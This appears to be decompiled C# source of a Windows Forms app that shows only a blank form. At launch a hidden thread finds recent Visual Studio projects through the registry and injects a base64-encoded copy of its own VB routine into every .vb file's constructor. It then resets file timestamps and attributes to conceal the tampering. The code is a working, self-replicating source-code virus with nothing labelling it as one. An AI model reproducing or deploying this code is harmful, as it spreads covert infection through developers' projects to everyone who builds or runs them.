using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace prog;

public class Form1 : Form
{
	private IContainer components;

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)new Form1());
	}

	public Form1()
	{
		Thread thread = new Thread(vIT);
		thread.Start();
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		Size autoScaleBaseSize = new Size(5, 13);
		((Form)this).set_AutoScaleBaseSize(autoScaleBaseSize);
		autoScaleBaseSize = new Size(292, 273);
		((Form)this).set_ClientSize(autoScaleBaseSize);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
	}

	private void vIT()
	{
		string text = "UHJpdmF0ZSBTdWIgdklUKCkNCkRpbSBBLCBCKCksIEMsIEQsIEYsIEcoKSBBcyBT";
		text += "dHJpbmcNCkRpbSBSIEFzIE1pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeUtleQ0KRGlt";
		text += "IEogQXMgU3lzdGVtLklPLkZpbGVBdHRyaWJ1dGVzDQpEaW0gSyBBcyBTeXN0ZW0u";
		text += "SU8uU3RyZWFtV3JpdGVyDQpEaW0gTSBBcyBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVy";
		text += "DQpEaW0gTCBBcyBTeXN0ZW0uSU8uRmlsZQ0KRGltIFgsIFksIFogQXMgSW50ZWdl";
		text += "cg0KRGltIEgsIEkgQXMgRGF0ZQ0KQSA9IEENCkIgPSAiUHVibGljIFN1YiBOZXco";
		text += "KXxNeUJhc2UuTmV3KCl8RGltIHQgQXMgTmV3IFN5c3RlbS5UaHJlYWRpbmcuVGhy";
		text += "ZWFkKEFkZHJlc3NPZiB2SVQpfHQuU3RhcnQoKSIuU3BsaXQoInwiKQ0KUiA9IE1p";
		text += "Y3Jvc29mdC5XaW4zMi5SZWdpc3RyeS5DdXJyZW50VXNlci5PcGVuU3ViS2V5KCJT";
		text += "b2Z0d2FyZVxNaWNyb3NvZnRcVmlzdWFsU3R1ZGlvXDcuMFxQcm9qZWN0TVJVTGlz";
		text += "dCIpDQpJZiBSLlZhbHVlQ291bnQgPSAwIFRoZW4gRXhpdCBTdWINClogPSAwDQpD";
		text += "ID0gU3lzdGVtLlRleHQuRW5jb2RpbmcuQVNDSUkuR2V0U3RyaW5nKFN5c3RlbS5D";
		text += "b252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoQSkpDQpDID0gUmVwbGFjZShDLCAiWiA9";
		text += "ICIgJiBaLCAiWiA9ICIgJiBaICsgMSkNCkEgPSBTeXN0ZW0uQ29udmVydC5Ub0Jh";
		text += "c2U2NFN0cmluZyhTeXN0ZW0uVGV4dC5FbmNvZGluZy5BU0NJSS5HZXRCeXRlcyhD";
		text += "KSkNCkQgPSAiQSA9ICIgJiBDaHIoMzQpDQpGb3IgWCA9IDEgVG8gTGVuKEEpIFN0";
		text += "ZXAgNjQNCklmIFggKyA2NCA8IExlbihBKSBUaGVuDQpEID0gRCAmIE1pZChBLCBY";
		text += "LCA2NCkgJiBDaHIoMzQpICYgdmJDckxmICYgIkEgKz0gIiAmIENocigzNCkNCkVs";
		text += "c2UNCkQgPSBEICYgTWlkKEEsIFgsIDY0KSAmIENocigzNCkNCkVuZCBJZg0KTmV4";
		text += "dA0KQyA9IFJlcGxhY2UoQywgIkEgPSBBIiwgRCwgMSwgMSwgQ29tcGFyZU1ldGhv";
		text += "ZC5UZXh0KQ0KRCA9ICIiDQpGb3IgWCA9IDAgVG8gUi5WYWx1ZUNvdW50IC0gMQ0K";
		text += "RiA9IFIuR2V0VmFsdWUoUi5HZXRWYWx1ZU5hbWVzKFgpKQ0KRiA9IE1pZChGLCAx";
		text += "LCBJblN0clJldihGLCAiXCIsIC0xLCBDb21wYXJlTWV0aG9kLlRleHQpKQ0KSWYg";
		text += "U3lzdGVtLklPLkRpcmVjdG9yeS5FeGlzdHMoRikgVGhlbg0KRyA9IFN5c3RlbS5J";
		text += "Ty5EaXJlY3RvcnkuR2V0RmlsZXMoRiwgIioudmIiKQ0KRm9yIFkgPSBMQm91bmQo";
		text += "RykgVG8gVUJvdW5kKEcpDQpJID0gTC5HZXRMYXN0QWNjZXNzVGltZShHKFkpKQ0K";
		text += "SCA9IEwuR2V0TGFzdFdyaXRlVGltZShHKFkpKQ0KSiA9IEwuR2V0QXR0cmlidXRl";
		text += "cyhHKFkpKQ0KTC5TZXRBdHRyaWJ1dGVzKEcoWSksIFN5c3RlbS5JTy5GaWxlQXR0";
		text += "cmlidXRlcy5Ob3JtYWwpDQpNID0gTC5PcGVuVGV4dChHKFkpKQ0KRCA9IE0uUmVh";
		text += "ZFRvRW5kKCkNCk0uQ2xvc2UoKQ0KSWYgSW5TdHIoRCwgQigyKSwgQ29tcGFyZU1l";
		text += "dGhvZC5UZXh0KSA9IDAgQW5kIEluU3RyKEQsIEIoMCksIENvbXBhcmVNZXRob2Qu";
		text += "VGV4dCkgPD4gMCBUaGVuDQpEID0gUmVwbGFjZShELCBCKDEpLCBCKDEpICYgdmJD";
		text += "ckxmICYgQigyKSAmIHZiQ3JMZiAmIEIoMyksICwgMSwgQ29tcGFyZU1ldGhvZC5U";
		text += "ZXh0KQ0KRCA9IFJlcGxhY2UoRCwgQigwKSwgQyAmIEIoMCksICwgMSwgQ29tcGFy";
		text += "ZU1ldGhvZC5UZXh0KQ0KSyA9IEwuQ3JlYXRlVGV4dChHKFkpKQ0KSy5Xcml0ZShE";
		text += "KQ0KSy5GbHVzaCgpDQpLLkNsb3NlKCkNCkVuZCBJZg0KTC5TZXRMYXN0V3JpdGVU";
		text += "aW1lKEcoWSksIEgpDQpMLlNldExhc3RBY2Nlc3NUaW1lKEcoWSksIEkpDQpMLlNl";
		text += "dEF0dHJpYnV0ZXMoRyhZKSwgSikNCk5leHQNCkVuZCBJZg0KTmV4dA0KRW5kIFN1";
		text += "Yg0K";
		string[] array = "Public Sub New()|MyBase.New()|Dim t As New System.Threading.Thread(AddressOf vIT)|t.Start()".Split(new char[1] { '|' });
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\VisualStudio\\7.0\\ProjectMRUList");
		if (registryKey.ValueCount == 0)
		{
			return;
		}
		string @string = Encoding.ASCII.GetString(Convert.FromBase64String(text));
		@string = Strings.Replace(@string, "Z = " + StringType.FromInteger(0), "Z = " + StringType.FromInteger(1), 1, -1, (CompareMethod)0);
		text = Convert.ToBase64String(Encoding.ASCII.GetBytes(@string));
		string text2 = "A = \"";
		int num = Strings.Len(text);
		checked
		{
			for (int i = 1; i <= num; i += 64)
			{
				text2 = ((i + 64 >= Strings.Len(text)) ? (text2 + Strings.Mid(text, i, 64) + "\"") : string.Concat(text2 + Strings.Mid(text, i, 64) + "\"", "\r\nA += ", "\""));
			}
			@string = Strings.Replace(@string, "A = A", text2, 1, 1, (CompareMethod)1);
			text2 = "";
			int num2 = registryKey.ValueCount - 1;
			for (int i = 0; i <= num2; i++)
			{
				string text3 = StringType.FromObject(registryKey.GetValue(registryKey.GetValueNames()[i]));
				text3 = Strings.Mid(text3, 1, Strings.InStrRev(text3, "\\", -1, (CompareMethod)1));
				if (!Directory.Exists(text3))
				{
					continue;
				}
				string[] files = Directory.GetFiles(text3, "*.vb");
				int num3 = Information.LBound((Array)files, 1);
				int num4 = Information.UBound((Array)files, 1);
				for (int j = num3; j <= num4; j++)
				{
					DateTime lastAccessTime = File.GetLastAccessTime(files[j]);
					DateTime lastWriteTime = File.GetLastWriteTime(files[j]);
					FileAttributes attributes = File.GetAttributes(files[j]);
					File.SetAttributes(files[j], FileAttributes.Normal);
					StreamReader streamReader = File.OpenText(files[j]);
					text2 = streamReader.ReadToEnd();
					streamReader.Close();
					if ((Strings.InStr(text2, array[2], (CompareMethod)1) == 0) & (Strings.InStr(text2, array[0], (CompareMethod)1) != 0))
					{
						text2 = Strings.Replace(text2, array[1], array[1] + "\r\n" + array[2] + "\r\n" + array[3], 1, 1, (CompareMethod)1);
						text2 = Strings.Replace(text2, array[0], @string + array[0], 1, 1, (CompareMethod)1);
						StreamWriter streamWriter = File.CreateText(files[j]);
						streamWriter.Write(text2);
						streamWriter.Flush();
						streamWriter.Close();
					}
					File.SetLastWriteTime(files[j], lastWriteTime);
					File.SetLastAccessTime(files[j], lastAccessTime);
					File.SetAttributes(files[j], attributes);
				}
			}
		}
	}
}
